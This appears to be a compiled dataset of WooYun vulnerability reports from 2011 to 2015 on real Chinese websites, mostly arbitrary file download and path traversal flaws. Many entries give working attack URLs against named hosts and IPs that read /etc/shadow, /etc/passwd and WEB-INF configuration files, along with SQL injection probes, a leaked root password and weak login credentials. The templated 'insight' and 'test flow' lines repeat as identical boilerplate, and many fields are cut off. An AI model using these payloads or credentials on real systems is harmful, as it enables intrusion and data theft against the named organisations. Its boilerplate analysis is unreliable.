
---
### [wooyun-2013-021051] 武汉行风行政投诉网任意文件下载,源码泄露
**厂商**: 武汉行风行政投诉 | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://hflx.whjjjc.org.cn/fileDown?fname=/index.jsphflx.whjjjc.org.cn/fileDown?fname=/application/login/loginCheck.jsp

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-054153] 惠东县卫生局任意文件下载
**厂商**: 惠东县卫生局 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://www.hdws.gov.cn/download.php?id=../download.php

**POC**: www.hdws.gov.cn/download.php?id=../download.php

**绕过**: 直接利用

**修复**: 禁止目录跨越
---

---
### [wooyun-2012-08817] 福建交通厅某系统Tomcat目录遍历漏洞、未限制URL访问漏洞
**厂商**: 福建交通厅某系统 | **年份**: 2012 | **类型**: 内部绝密信息泄漏

**元思考**: 触发信号: 功能测试

**洞察**: 内部绝密信息泄漏防护不足，开发者信任前端输入

**测试流程**:
1. 识别内部绝密信息泄漏相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 由于Tomcat配置错误，造成目录遍历，这可使入侵者获取一些有用的信息。第二：在Tomcat部署了自主研发的OA系统，某些管理页面未限制访问，入侵者可以任意配置管理员

**POC**: http://218.85.65.16:9088/jsp/http://218.85.65.16:9088/jsp/oa/spdeployIndex.jsp

**绕过**: 直接利用

**修复**: 重新配置Tomcat文件，修改conf/server.xml文件，请listings参数对应的值改为false即可<servlet>        <servlet-name>default</servlet-name>        <servlet-class>org.apache.catali
---

---
### [wooyun-2012-013729] j2ee分层架构安全（注册乌云1周年庆祝集锦） --  点我吧
**厂商**: dianwoba.com | **年份**: 2012 | **类型**: 系统/服务运维配置不当

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务运维配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务运维配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 首先看一个以前典型的case:WooYun: 去哪儿任意文件读取（基本可重构该系统原工程）或哥这篇粗糙的文章：http://hi.baidu.com/shine%5F%C9%C1%C1%E9/blog/item/7d7d57445f523a4384352468.html

**POC**: http://www.dianwoba.com/WEB-INF/web.xml为什么注射点那么多了？

**绕过**: 直接利用

**修复**: 如上！
---

---
### [wooyun-2012-016267] ChinaCache节点监控后台无授权访问并存在任意文件读取漏洞
**厂商**: ChinaCache | **年份**: 2012 | **类型**: 未授权访问/权限绕过

**元思考**: 触发信号: 后台管理

**洞察**: 未授权访问/权限绕过防护不足，开发者信任前端输入

**测试流程**:
1. 识别未授权访问/权限绕过相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://110.4.12.172:21900/类似这个，21900端口即为监控后台，里面有配置文件，日志等。

**POC**: CSL-HK-1-3X3 -- ChinaCache查看配置文件的地方稍作参数修改，即可已root权限读取文件

**绕过**: 直接利用

**修复**: 至少加个Basic Auth吧。
---

---
### [wooyun-2015-096712] 中国人寿任意文件下载
**厂商**: 中国人寿 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 后台管理

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://www.e-chinalife.com/cardmisfile/uploadFiles/download.jsp?type=1&PDFnameArr=../../../index.jsp&Onputname=1.jsp挖出来了个后台，貌似已经不用了http://www.e-chinalife.com/selfcard/mis/manager/login/frmLogin.jsp

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 这种洞一般无影响，但也只是一般，万一呢。。修复与否无所谓，看厂商心情吧。
---

---
### [wooyun-2014-087153] 浙大万朋教育信息发布系统任意文件下载漏洞
**厂商**: 国家互联网应急中心 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 谷歌关键字  intitle:ZDSOFT.NET信息发布平台任意文件下载漏洞链接： /cnet/servlet/servletupload

**POC**: 测试案例：0x01山东省烟台市教育局 http://www.ytedu.cn/cnet/dynamic/presentation/net_1/index.jsp?unitid=1任意文件下载：http://www.ytedu.cn/cnet/servlet/servletupload?domesticfile=WEB-INF/web.xml0x02山东省广饶县教育局http://www.grjy.net:81/cnet/dynamic/presentation/edu_7/index.jsp?templateid=4任意文件下载：http://www.grjy.net:81/cnet/serv

**绕过**: 直接利用

**修复**: 路径过滤
---

---
### [wooyun-2015-0133745] 某通用型CMS存在任意文件下载漏洞
**厂商**: 石家庄载驰科技 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 石家庄载驰科技存在任意文件下载漏洞。。。

**POC**: google 一下技术支持：载驰科技用户不少。有学校，有法院。。。石家庄新华区人民法院http://**.**.**.**/dynamic/download.jsp?path=/dynamic/download.jsp石家庄美术馆http://**.**.**.**/dynamic/download.jsp?path=/dynamic/download.jsp石家庄教育科学研究所http://**.**.**.**/dynamic/download.jsp?path=/dynamic/download.jsp河北水利网http://**.**.**.**/dynamic/download.js

**绕过**: 直接利用

**修复**: 121
---

---
### [wooyun-2012-013716] j2ee分层架构安全（注册乌云1周年庆祝集锦） -- 1号店
**厂商**: 1号店 | **年份**: 2012 | **类型**: 系统/服务运维配置不当

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务运维配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务运维配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 首先看一个以前典型的case:WooYun: 去哪儿任意文件读取（基本可重构该系统原工程）或哥这篇粗糙的文章：http://hi.baidu.com/shine%5F%C9%C1%C1%E9/blog/item/7d7d57445f523a4384352468.html

**POC**: http://image.yihaodian.com/WEB-INF/web.xml

**绕过**: 直接利用

**修复**: 多注意WEB-INF目录！
---

---
### [wooyun-2011-01435] 网易分站敏感信息泄漏
**厂商**: 网易 | **年份**: 2011 | **类型**: 系统/服务运维配置不当

**元思考**: 触发信号: 后台管理

**洞察**: 系统/服务运维配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务运维配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 网易分站敏感信息泄漏,目录遍历,后台未加验证码!可以暴力猜解破解 .svn目录未删除

**POC**: http://xy2.zhidao.163.com/htdocs/ask/js/.svn/entriesSVN未删除~~~http://xy2.zhidao.163.com/htdocs/ask/遍历目录http://xy2.zhidao.163.com/htdocs/admin/admin_login.html后台没验证码

**绕过**: 直接利用

**修复**: 你懂的~~
---

---
### [wooyun-2014-087978] 上海奔腾电器官网（注入+目录遍历+后台弱密码）
**厂商**: 上海奔腾电器 | **年份**: 2014 | **类型**: SQL注射漏洞

**元思考**: 触发信号: 后台管理

**洞察**: SQL注射漏洞防护不足，开发者信任前端输入

**测试流程**:
1. 识别SQL注射漏洞相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 上海奔腾电器官网：http://www.povos.com.cn/cn/index.aspx注入点：http://pcp.povos.com.cn/6s_detail.jsp?id=10023目录遍历：http://www.povos.com.cn/admin/后台弱密码都是admin

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-091205] 某MAS移动代理服务器任意文件下载
**厂商**: 中国移动 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 某MAS移动代理服务器任意文件下载漏洞

**POC**: http://61.145.228.19http://61.145.228.19/serverLog.do?act=upload&fileName=../../../../../../../../../../etc/shadow解压shadow.ziphttp://61.145.228.19/serverLog.do?act=upload&fileName=../../../../../../../../../../MAS/jboss-4.2.1/server/default/conf/jboss-service.xml

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2013-045447] 人民网邮件系统任意文件读取漏洞
**厂商**: 人民网 | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://mail.people.com.cn/res/I18nMsg,AjxMsg,ZMsg,ZmMsg,AjxKeys,ZmKeys,ZdMsg,Ajx%20TemplateMsg.js.zgz?v=091214175450&skin=../../../../../../../../../etc/passwd%00exp下载：http://www.exploit-db.com/sploits/zimbraexploit_rubina119.zip

**POC**: http://mail.people.com.cn/res/I18nMsg,AjxMsg,ZMsg,ZmMsg,AjxKeys,ZmKeys,ZdMsg,Ajx%20TemplateMsg.js.zgz?v=091214175450&skin=../../../../../../../../../etc/passwd%00

**绕过**: 直接利用

**修复**: 看看Zimbra有没有升级
---

---
### [wooyun-2014-055088] 吉林市某政府网站目录遍历及弱口令
**厂商**: 吉林市某政府网 | **年份**: 2014 | **类型**: 系统/服务运维配置不当

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务运维配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务运维配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://www.panshi.gov.cn/

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-028980] 某物质采购供应管理信息系统多处漏洞
**厂商**: 北京某科技有限公司 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 参数注入, 上传功能

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1.任意文件下载漏洞：~/b2b/web/fileuploadAction.do?method=downLoad&fileName=web.xml&fileType=text&fjbh=web&fjml=/WEB-INF/~/PortletfileuploadAction.do?method=downLoad&fileName=web.xml&fileType=text&fjbh=web&fjml=/WEB-INF/~/b2b/web/uploadAction.do?method=downLoad&fileType=text&fileName=/etc/passwd2.SQL注射漏洞：~/b2b/web/indexinfoAction.do?actionType=showNewProductDetail&xxbh=xxoo' and 1=1--看了某一个的源码（应该大家都差不多吧），参数是

**POC**: google一下，发现好几家企业中了枪：中国中煤能源集团有限公司物资采购电子商务网：http://cg.chinacoal.com:7002神华神东电力有限责任公司电子商务平台：http://wzcg.shendongpower.com.cn中国水利水电建设股份有限公司设备物资管理信息系统：http://218.28.177.28中石油下属的几个：http://218.97.217.115http://222.83.251.40http://111.11.144.1...

**绕过**: 直接利用

**修复**: NULL
---

---
### [wooyun-2015-0115177] 优酷几处运维安全隐患
**厂商**: 优酷 | **年份**: 2015 | **类型**: 重要敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 重要敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别重要敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: resin未授权访问0x01.读源代码http://111.206.111.101:81/resin-doc/examples/ioc-periodictask/viewfile?file=index.xtp读配置http://111.206.111.101:81/resin-doc/examples/ioc-periodictask/viewfile?file=WEB-INF/web.xml读密码http://111.206.111.101:81/resin-doc/examples/security-basic/viewfile?file=WEB-INF/password.xml0x02.#和上个情况类似就不一一贴图了读密码http://211.151.146.69:81/resin-doc/examples/security-basic/viewfile?file=WEB-INF/p

**POC**: OGNL console 未授权访问http://index.youku.com//struts/webconsole.htmljoomla后台，无验证码可爆破http://kfc24h.youku.com/administrator/youku管理后台 无验证码可爆破http://lego.youku.com/admin/login.phphttp://hvsop.youku.com/admin/

**绕过**: 直接利用

**修复**: 这个你们应该比较有经验
---

---
### [wooyun-2015-0155969] 某大学成人教育信息完全泄漏
**厂商**: sjtu.edu.cn | **年份**: 2015 | **类型**: 网络设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 网络设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别网络设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 注入点：http://jxjy.shsmu.edu.cn/ShowBroad.aspx?Broad=201511241056系统进入点：http://jxjy.shsmu.edu.cn/目录遍历：http://jxjy.shsmu.edu.cn/photo/13/帐号密码什么的就不用细说了

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 来个高rank，
---

---
### [wooyun-2015-0120065] 通付宝某处管理不当泄露敏感信息导致内部信息安全受到影响
**厂商**: 通付宝网络技术有限公司 | **年份**: 2015 | **类型**: 重要敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 重要敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别重要敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 这是一个神奇的网站：https://github.com/***/doc1、看到日志连接，就点进去了，目测url存在任意文件读取，于是。。。2、和很多大型平台（美丽说、携程、拉手网。。。）的对接文档，涉及用户名密码哦3、邮箱沦陷...整个文档包括太多公司信息，还是尽快从github上删除吧。通付宝看名称就知道涉及金融的，员工安全意识还有待加强，本次测试未作任何破坏，仅证明问题。

**POC**: 详细说明

**绕过**: 直接利用

**修复**: 加强安全意识
---

---
### [wooyun-2015-0140104] 迅雷两个服务器配置不当导致任意文件遍历
**厂商**: 迅雷 | **年份**: 2015 | **类型**: 应用配置错误

**元思考**: 触发信号: 功能测试

**洞察**: 应用配置错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别应用配置错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 正在 Ping twin13a066.sandai.net [42.51.169.166] 具有 32 字节的数据:来自 42.51.169.166 的回复: 字节=32 时间=67ms TTL=47来自 42.51.169.166 的回复: 字节=32 时间=63ms TTL=47来自 42.51.169.166 的回复: 字节=32 时间=62ms TTL=47来自 42.51.169.166 的回复: 字节=32 时间=63ms TTL=4742.51.169.166 的 Ping 统计信息:数据包: 已发送 = 4，已接收 = 4，丢失 = 0 (0% 丢失)，往返行程的估计时间(以毫秒为单位):最短 = 62ms，最长 = 67ms，平均 = 63msC:\Users\Administrator.USER-20150727BH>ping svr2.support.client.x

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 修复
---

---
### [wooyun-2014-079955] 任子行技术管控平台存在高危漏洞可下载任意文件
**厂商**: 任子行 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 任子行技术管控平台存在任意文件下载漏洞，导致非法分子可以下载设备shadow等文件暴力破解root用户口令。

**POC**: 通过访问http://url/smcs_zj/framework/filehandle/fileHandle/downOpenFile.do?fileName=passwd.zip&filePath=../../../../../../etc/shadow可以获取账户名密码文件

**绕过**: 直接利用

**修复**: 修复代码
---

---
### [wooyun-2015-0118646] 中国采购与招标网主站任意文件下载
**厂商**: 中国采购与招标网 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 后台管理

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://www.chinabidding.com.cn/download/download_file.jsp?record_id=4231669&filename=web.xml&filepath=../../../WEB-INF<?xml version="1.0" encoding="ISO-8859-1"?><web-app><!-- 公用 开始--><servlet><servlet-name>TemplateLoad</servlet-name><servlet-class>com.cbl.lib.InitTemplateServlet</servlet-class><init-param><param-name>templates.path</param-name><param-value>WEB-INF/conf/templates.properties</param-

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0128238] 维也纳某站任意文件下载(进入邮箱及敏感信息泄露)
**厂商**: wyn88.com | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: cj.wyn88.com 文件下载的时候并没有对下载的文件目录及类型进行过滤，导致可以下载服务器上的任意文件 。以下载web.config为例 ：

**POC**: 然后就登录邮箱，然后就可导出全体通讯录，最近也升级成腾讯企业邮箱啦 ，不错。

**绕过**: 直接利用

**修复**: 限制下载文件目录，及类型
---

---
### [wooyun-2014-051383] 某通用型政府系统任意文件下载
**厂商**: cncert国家互联网应急中心 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1.漏洞出现在download.jsp中源码分析一下：<%@page language="java" contentType="application/x-msdownload" import="java.io.*,java.net.*" pageEncoding="gb2312"%><%String temp=request.getParameter("path");if(temp.indexOf("UserFiles")==-1){ //此处仅判断url中是否存在UserFiles关键字out.println("非法下载路径！");return;}String path=temp;//new String(temp.getBytes("8859_1"),"gb2312"); //temp路径未做处理直接赋值给path，并用于下面的文件读取response.reset();respons

**POC**: jjcx.fjgat.gov.cn/download.jsp?path=UserFiles/../download.jspwww.fjhi.gov.cn/site/quanzhou/bin//download.jsp?path=UserFiles/../download.jspcrj.fjgat.gov.cn/download.jsp?path=UserFiles/../download.jspqz.fjhi.gov.cn/site/quanzhou/bin//download.jsp?path=UserFiles/../download.jspwww.fjhi.gov.cn/site/qua

**绕过**: 直接利用

**修复**: 麻烦通知修复吧
---

---
### [wooyun-2015-0113715] 广西壮族自治区中等职业教育综合管理系统的安全问题
**厂商**: CCERT教育网应急响应组 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 认证接口, 上传功能

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 呃。。。前几天上传了一个相同系统的漏洞，但是一直都没有审核，我也不清楚这样的漏洞价值有多少，也不清楚同一系统的问题应该怎么提交，所以就先这样吧！！登陆网址：zzzs.gxzyjy.net1、首先是任意文件下载：URL：http://zzzs.gxzyjy.net:80/servlet/DownLoadAttachmentServlet?type=notice&fileId=163&serverfilename=../../../../../../../../etc/passwd同时也能下载：/etc/shadow、/root/.bash_history、/etc/services剩下的就没有试了。2、然后是弱口令泄露学校学生信息。用户名  密码    人数aaa     123   （少量学生）888     123   （少量学生信息）abc     123    (1000多学生）99

**POC**: 1、下载的系统文件2、用户信息

**绕过**: 直接利用

**修复**: 修改弱口令，加强下载地址的过滤.
---

---
### [wooyun-2014-066197] 某nc服务器配置不当泄露敏感信息
**厂商**: 用友软件 | **年份**: 2014 | **类型**: 重要敏感信息泄露

**元思考**: 触发信号: 认证接口

**洞察**: 重要敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别重要敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://117.79.92.214/ 目录遍历，泄露账户信息然后登陆http://117.79.92.213/login.jsp看到若干帐套信息，还有数据库的备份脚本，

**POC**: http://117.79.92.214/ 目录遍历，泄露账户信息然后登陆http://117.79.92.213/login.jsp看到若干帐套信息，还有数据库的备份脚本，

**绕过**: 直接利用

**修复**: 你们懂的，不献丑了
---

---
### [wooyun-2012-013714] j2ee分层架构安全（注册乌云1周年庆祝集锦）之搜狐
**厂商**: 搜狐 | **年份**: 2012 | **类型**: 系统/服务运维配置不当

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务运维配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务运维配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 首先看一个以前典型的case:WooYun: 去哪儿任意文件读取（基本可重构该系统原工程）或哥这篇粗糙的文章：http://hi.baidu.com/shine%5F%C9%C1%C1%E9/blog/item/7d7d57445f523a4384352468.html

**POC**: http://123.125.116.86/WEB-INF/web.xmlhttp://123.125.116.86/WEB-INF/classes/struts.xmlhttp://123.125.116.59/WEB-INF/web.xmlhttp://123.125.116.123/WEB-INF/web.xmlhttp://123.126.48.16/WEB-INF/web.xmlhttp://123.126.48.47/WEB-INF/web.xmlhttp://123.126.48.48/WEB-INF/web.xml

**绕过**: 直接利用

**修复**: 多注意WEB-INF目录！
---

---
### [wooyun-2013-045334] dedecms目测被挂马，恶意文件下载
**厂商**: Dedecms | **年份**: 2013 | **类型**: 钓鱼欺诈信息

**元思考**: 触发信号: 功能测试

**洞察**: 钓鱼欺诈信息防护不足，开发者信任前端输入

**测试流程**:
1. 识别钓鱼欺诈信息相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 本地环境搭建的和服务器中的都会出现这种现象，应该不是我网络问题吧下载下来后，管家报毒，七十多k很像木马的体积。手冻的冰凉，粗略看了下也没找到挂马的地方。。。

**POC**: 本地环境搭建的和服务器中的都会出现这种现象，应该不是我网络问题吧下载下来后，管家报毒，七十多k很像木马的体积。手冻的冰凉，粗略看了下也没找到挂马的地方。。。

**绕过**: 直接利用

**修复**: 你懂
---

---
### [wooyun-2015-0137810] 派路由某漏洞导致多个服务器沦陷
**厂商**: 派路由 | **年份**: 2015 | **类型**: 敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://www.pifii.com/测试发现，派路由的机房大概IP电信：#125.89.70.204125.89.70.205125.89.70.206125.89.70.207125.89.70.208125.89.70.209联通：#218.104.193.204218.104.193.205218.104.193.206218.104.193.207218.104.193.208218.104.193.209大部分都存在通用密码，root/ZH@id#0427。可以看出来，已经被入侵过了，上面有msf。官网服务器也是这个密码，沦陷泄漏用户数据库信息同时还存在备份文件下载。泄漏大量用户信息[root@localhost classes]# ifconfigeth0      Link encap:Ethernet  HWaddr 00:24:E8:4C:C9:D1inet add

**POC**: http://www.pifii.com/测试发现，派路由的机房大概IP电信：#125.89.70.204125.89.70.205125.89.70.206125.89.70.207125.89.70.208125.89.70.209联通：#218.104.193.204218.104.193.205218.104.193.206218.104.193.207218.104.193.208218.104.193.209大部分都存在通用密码，root/ZH@id#0427。可以看出来，已经被入侵过了，上面有msf。官网服务器也是这个密码，沦陷泄漏用户数据库信息同时还存在备份文件下载。泄漏大量用

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0118508] 天天快递网络办公系统内部文件未授权下载
**厂商**: ttkdex.com | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 工具扫描出了文件下载列表所在页面；点击要下载的文件，右键用QQ旋风下载view.asp；view.asp中有此文件的相对路径；工具同时工具扫描出了文件下载目录；由相对路径和文件下载目录即可得到文件绝对路径。http://gprsb.ttkd.cn/e3oa/wtj/down.asp?action=%E8%A1%8C%E6%94%BF

**POC**: (见原文)

**绕过**: 直接利用

**修复**: asp页面中不要包含文件路径；下载文件需要验证用户登录状态；
---

---
### [wooyun-2015-0106007] 深航酒店直接绕过权限添加管理员帐号，泄漏大量的客户信息
**厂商**: 深航酒店 | **年份**: 2015 | **类型**: 未授权访问/权限绕过

**元思考**: 触发信号: 认证接口, 后台管理

**洞察**: 未授权访问/权限绕过防护不足，开发者信任前端输入

**测试流程**:
1. 识别未授权访问/权限绕过相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 直接绕过权限添加管理帐号http://www.szahotel.com/admin/addUser.aspx我已经添加一个测试帐号：a7878a后台地址：http://www.szahotel.com/admin/szalogin99.aspx目录遍历：http://www.szahotel.com/admin/直接登陆后台大量的客户预订信息客户的积分和详细信息不知道哪里来的大量的管理帐号

**POC**: 直接绕过权限添加管理帐号http://www.szahotel.com/admin/addUser.aspx我已经添加一个测试帐号：a7878a后台地址：http://www.szahotel.com/admin/szalogin99.aspx目录遍历：http://www.szahotel.com/admin/直接登陆后台大量的客户预订信息客户的积分和详细信息不知道哪里来的大量的管理帐号

**绕过**: 过滤绕过

**修复**: 直接让维护人员滚蛋回家！漏洞百出！加强权限管理！删除无用的帐号，删除测试帐号：a7878a
---

---
### [wooyun-2015-0136271] 搜狐某些服务文件下载漏洞
**厂商**: 搜狐 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 第一台漏洞地址：http://123.125.116.123/../../../etc/passwdhttp://123.125.116.123/../../../etc/hosts第二台漏洞地址：http://220.181.2.41/../../../etc/passwd截图：

**POC**: 搜狐判断依据，同C段多个搜狐服务：http://123.125.116.75/login.jsp 搜狐公司版权所有http://123.125.116.109 搜狐图片http://123.125.116.151  Welcome to SOHU!http://123.125.116.222 .sohu.com (squid)http://123.125.116.223 .sohu.com (squid)

**绕过**: 直接利用

**修复**: 修改程序逻辑。
---

---
### [wooyun-2015-0143552] 苏州市烟草专卖局某系统存在任意文件下载、包含漏洞
**厂商**: 苏州市烟草专卖局 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 苏州烟草微信管理系统http://**.**.**.**1#任意文件下载2处http://**.**.**.**/a.picauto?path=C:\Windows\win.inihttp://**.**.**.**/public/a.picauto?path=C:\Windows\win.ini

**POC**: 2#文件包含多处POST http://**.**.**.**/public/ticketcus.jsp.ticket2form_UpdateCus.do HTTP/1.1Accept-Language: zh-CNAccept-Charset: utf-8, iso-8859-1, utf-16, *;q=0.7Referer: http://**.**.**.**/public/ticketcus.jsp.ticket2form_Into.do?openId=人为马赛克User-Agent: Mozilla/5.0 (Linux; U; Android 4.4.4; zh-cn; HM N

**绕过**: 直接利用

**修复**: 过滤
---

---
### [wooyun-2015-0150727] 中国移动政企客户业务任意文件读取
**厂商**: 中国移动 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 中国移动政企客户网站任意文件读取

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-088416] 汽车点评网某系统任意文件读取
**厂商**: xgo.com.cn | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://mail.xgo.com.cn/login.php?Lang=invalid../../../../../../../../../../etc/passwd/./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 额
---

---
### [wooyun-2012-014326] baidu分站任意文件下载漏洞
**厂商**: 百度 | **年份**: 2012 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: discovery.baidu.com/down_bizi2.php?thumb=/program.php没任何过滤，直接下载

**POC**: discovery.baidu.com/down_bizi2.php?thumb=/program.php

**绕过**: 直接利用

**修复**: 你猜
---

---
### [wooyun-2015-0101932] 中国电信某站任意文件下载
**厂商**: 中国电信 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://59.51.130.42/testDown1.php?Name=../testDown1.php

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-051947] URP综合教务系统目录遍历和非授权访问导致大量用户敏感信息泄露
**厂商**: 北京清元优软科技有限公司 | **年份**: 2014 | **类型**: 敏感信息泄露

**元思考**: 触发信号: 认证接口

**洞察**: 敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

